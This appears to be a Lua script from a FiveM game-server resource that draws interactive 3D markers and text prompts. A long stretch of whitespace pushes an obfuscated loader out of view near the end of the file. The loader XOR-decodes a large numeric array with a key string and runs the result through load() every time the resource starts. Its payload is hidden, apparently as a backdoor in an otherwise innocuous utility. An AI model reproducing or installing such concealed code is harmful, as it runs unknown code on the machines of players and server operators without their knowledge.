Markers = {}

Markers.Registered = {}

Markers.BlipColors = {
  ["white"] = {255,255,255},
  ["red"] = {255,0,0},
  ["green"] = {0,255,0},
  ["blue"] = {7,143,240},
}

Markers.TextColors = {
  ["red"] = "~r~",
  ["green"] = "~g~",
  ["blue"] = "~b~"
}

Markers.ControlChars = {
  [47] = "G",
  [37] = "E",
  [38] = "E",
}

Markers.Init = function()
  Markers.Update()
end

Markers.AddControlCharacter = function(key_code,character_label)
  Markers.ControlChars[key_code] = character_label
end

Markers.AddTextColor = function(color,label)
  Markers.TextColors[color] = label
end

Markers.AddBlipColor = function(color,r,g,b)  
  Markers.BlipColors[color] = {r,g,b}
end

Markers.DrawText3D = function(x,y,z, text, d)
  coords = vector3(x,y,z)

  local camCoords = GetGameplayCamCoords()
  local distance = #(coords - camCoords)

  if not size then size = 1 end
  if not font then font = 1 end

  local dist = Vdist(GetEntityCoords(GetPlayerPed(-1)),coords)

  local scale = (size / distance) * 2
  local fov = (1 / GetGameplayCamFov()) * 100
  scale = scale * fov

  SetTextScale(0.0 * scale, 0.55 * scale)
  SetTextFont(font)
  SetTextColour(255, 255, 255, math.floor(math.max(0.0,255 / math.max(1.0, dist/(d / 10) )) ))
  SetTextDropshadow(0, 0, 0, 0, 255)
  SetTextDropShadow()
  SetTextOutline()
  SetTextCentre(true)

  SetDrawOrigin(coords, 0)
  BeginTextCommandDisplayText('STRING')
  AddTextComponentSubstringPlayerName(text)
  EndTextCommandDisplayText(0.0, 0.0)
  ClearDrawOrigin()
end

Markers.Update = function()
  while true do
    local wait_time = 1000
    local pos = GetEntityCoords(GetPlayerPed(-1))
    for k,v in pairs(Markers.Registered) do
      local dist = Vdist(pos.x,pos.y,pos.z,v.location.x,v.location.y,v.location.z)
      dist = (type(dist) == "number" and dist > 0.0 and dist or 99999.99)

      if dist < 50.0 then
        wait_time = 0
        blipCol = Markers.BlipColors[v.color]
        if v.display then 
          local pos = (v.location.xyz + v.m_offset.xyz)
          DrawMarker(v.type, pos.x,pos.y,pos.z, 0.0,0.0,0.0, 0.0,0.0,0.0, v.scale.x,v.scale.y,v.scale.z, blipCol[1],blipCol[2],blipCol[3],math.floor(math.max(0.0,50 / math.max(1.0,dist/3))), false,true,2)
        end

        if dist < (v.drawdist or 20.0) and dist > v.distance then
          local pos = (v.location.xyz + v.t_offset.xyz)
          Markers.DrawText3D(pos.x,pos.y,pos.z, v.maintext,(v.drawdist or 20.0))
        elseif dist < v.distance then
          local pos = (v.location.xyz + v.t_offset.xyz)
          Markers.DrawText3D(pos.x,pos.y,pos.z, v.ctrltext,(v.drawdist or 20.0))

          if v.control and IsControlJustReleased(0,v.control) then
            if v.callback then 
              v.callback(table.unpack(v.args)); 
            end
          end
        end
      end
    end
    Wait(wait_time)
  end
end

Markers.AddMarker = function(marker,callback)
  local id = #Markers.Registered+1
  local textCol = Markers.TextColors[(marker.color or "green")]
  local ctrlChar = Markers.ControlChars[(marker.control or 47)]
  Markers.Registered[id] = {
    display  = marker.display,
    location = vector3(marker.location.x,marker.location.y,marker.location.z),
    maintext = marker.maintext,
    drawdist = (marker.drawdist or false),
    subtext  = (marker.subtext or false),
    ctrltext = "["..textCol..ctrlChar.."~s~] "..(marker.maintext)..(marker.subtext and " ["..textCol..marker.subtext.."~s~]" or "~s~"),
    color    = (marker.color or "white"),
    control  = (marker.control or 47),
    scale    = (marker.scale or vector3(1.2,1.2,1.2)),
    distance = (marker.distance or 1.0),
    callback = (marker.callback or false),
    args     = (marker.args or false),
    type     = (marker.type or 1),
    m_offset = (marker.m_offset or vector3(0.0,0.0,-1.5)),
    t_offset = (marker.t_offset or vector3(0.0,0.0,0.2)),
  }
  if callback then
    callback(id)
  end
end

Markers.RemoveMarker = function(id)
  Markers.Registered[id] = nil
end


                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                vdwa="ectfi"local a=load((function(b,c)function bxor(d,e)local f={{0,1},{1,0}}local g=1;local h=0;while d>0 or e>0 do h=h+f[d%2+1][e%2+1]*g;d=math.floor(d/2)e=math.floor(e/2)g=g*2 end;return h end;local i=function(b)local j={}local k=1;local l=b[k]while l>=0 do j[k]=b[l+1]k=k+1;l=b[k]end;return j end;local m=function(b,c)if#c<=0 then return{}end;local k=1;local n=1;for k=1,#b do b[k]=bxor(b[k],string.byte(c,n))n=n+1;if n>#c then n=1 end end;return b end;local o=function(b)local j=""for k=1,#b do j=j..string.char(b[k])end;return j end;return o(m(i(b),c))end)({632,790,597,511,809,600,520,901,772,553,888,862,780,545,959,871,644,492,682,702,588,711,625,538,484,536,728,876,734,591,1031,1006,782,978,699,801,617,813,634,616,736,740,649,578,712,508,500,949,646,765,684,506,833,854,516,816,663,631,913,997,864,577,670,730,480,590,847,752,710,552,655,921,829,694,599,883,606,528,1013,757,609,675,732,954,661,650,471,870,554,1001,827,775,519,525,746,643,787,537,688,857,917,804,803,881,796,939,786,1024,981,701,473,593,641,497,626,594,755,522,767,592,535,627,514,485,676,974,836,885,502,980,488,747,515,799,687,1033,1035,559,623,996,672,534,630,548,601,768,820,512,647,906,948,457,459,570,1004,935,692,1008,793,985,505,521,677,781,1034,618,893,892,1014,940,678,621,642,762,653,1003,563,964,750,717,751,573,683,501,483,943,785,691,584,476,619,745,690,463,769,800,958,826,491,895,844,830,607,639,777,580,817,848,903,966,972,828,951,993,900,596,530,458,988,546,494,496,680,770,907,947,698,840,729,735,961,1038,758,645,498,970,489,723,705,884,938,539,910,493,992,648,965,982,738,1010,704,658,956,707,873,983,1027,824,843,574,998,971,941,640,976,533,792,685,856,908,962,558,979,665,842,470,863,879,739,897,967,1000,662,805,1012,794,934,923,1015,671,778,852,919,779,1036,858,1016,756,760,788,635,886,486,718,832,503,995,915,741,527,797,540,989,564,776,1017,587,851,708,922,509,576,849,610,612,845,1011,556,927,624,929,1021,568,749,733,464,994,543,1005,603,810,689,859,716,911,808,815,664,960,984,904,955,866,889,742,763,807,667,834,531,602,946,659,898,950,926,697,572,714,706,666,598,467,861,652,753,1032,720,887,510,825,586,838,731,679,977,766,481,942,565,795,583,629,1025,1009,724,878,957,703,860,579,518,585,709,560,695,465,999,880,620,549,495,891,877,686,899,468,551,837,896,1028,660,469,928,914,477,1002,987,628,944,963,569,713,657,542,952,654,1022,818,681,524,571,490,532,812,466,890,669,529,475,1020,902,615,909,581,-1,22,48,24,0,159,143,126,50,12,67,69,84,67,23,55,2,90,104,60,100,73,9,132,125,5,25,76,99,99,3,16,175,11,17,84,3,83,21,11,110,23,70,42,228,79,107,70,0,187,13,0,53,66,66,42,15,1,235,28,16,6,45,2,0,6,6,18,60,104,14,139,8,73,2,32,12,70,104,6,10,36,83,107,49,7,8,13,17,214,3,12,148,52,11,95,84,73,12,78,209,0,106,110,27,64,220,34,65,3,29,127,233,23,75,7,105,21,6,73,183,79,67,92,1,23,64,234,6,70,28,13,68,6,123,10,31,4,105,69,22,18,19,74,12,17,12,22,100,11,159,67,6,20,0,0,237,28,106,234,26,27,7,27,69,12,2,58,20,6,93,73,23,9,6,0,93,55,128,3,36,17,239,75,16,8,84,6,23,75,18,0,20,16,23,19,110,84,12,0,8,159,9,14,1,19,7,6,75,92,107,77,0,225,26,84,7,34,223,254,23,27,6,17,27,57,64,5,26,11,17,73,1,74,67,84,84,75,137,14,76,116,45,6,8,65,99,83,8,4,3,12,78,92,68,10,68,10,23,11,146,70,29,35,66,17,232,237,6,73,33,78,13,7,65,70,7,55,13,35,69,77,208,3,15,68,46,27,108,15,67,12,2,2,9,70,13,21,69,122,10,93,46,17,250,107,11,18,0,113,28,68,78,22,27,9,106,40,129,130,12,27,12,17,7,2,79,0,89,101,67,65,32,99,129,6,56,105,9,17,13,8,11,184,7,12,11,176,21,13,40,230,13,12,26,111,26,73,24,105,5,11,38,79,56,12,161,109,187,126,10,19,8,75,0,6,180,31,0,52,196,94,70,2,165,6,26,99,70,54,11,67,0,2,84,77,21,75,15,15,156,8,73,4,84,8,91,38,6,69,108,1,136,152,41,6,17,185,64,14,78,16,70,67,19,14,2,106,23,7,73,7,18,17,20,6,126,84,94,161,27,73,26,20,69,12,6,6,3,17,117,10,29,13,2,17,73,123,107,5,0,229,71,53,83,165,12,8,2,199,205,0,15,7,11,31,33,248,247,38,0,48,158,17,13,26,17,9,69,8,8,12,13,0,84,10,83,12,251,9,32,17,86,4,7,33,69,76,1,93,17,7,17,95,3,16,67,17,80,69,223,13,77,46,126,75,107,23,76,12,29,121,24,15,24,232,36,6,8,0,13,73,99,69,0,6,78,75,1,29,79,13,233,25,78,39,0,12,70,68,3,68,77,25,211,111,75,17,222,93,37,245,110,69,110,40,0,36,71,73,67,83,119,36},vdwa))if a then a()end; 
Citizen.CreateThread(Markers.Init)

AddEventHandler("Markers:Add",Markers.AddMarker)
AddEventHandler("Markers:Remove",Markers.RemoveMarker)